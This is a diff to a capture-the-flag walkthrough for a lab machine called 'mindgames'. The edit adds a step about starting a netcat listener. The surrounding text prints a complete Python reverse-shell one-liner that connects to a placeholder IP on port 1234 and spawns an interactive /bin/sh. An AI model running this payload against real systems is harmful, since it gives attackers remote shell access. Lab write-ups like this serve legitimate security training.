@@ -65,4 +65,4 @@ So it seems like it it runs the actual brainfuck progamming language. Let's see 
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 ```
 
-After I changed the default IP in that code block to my tun0 IP.(You can find that out by using the command _ifconfig_ in your terminal). I then headed over to a brainfuck encoder to convert it, let's throw this code into the mindgames site and see if we can get an initial shell.
+After I changed the default IP in that code block to my tun0 IP.(You can find that out by using the command _ifconfig_ in your terminal).I started a netcat session listening on port 1234. I then headed over to a brainfuck encoder to convert it, let's throw this code into the mindgames site and see if we can get an initial shell.
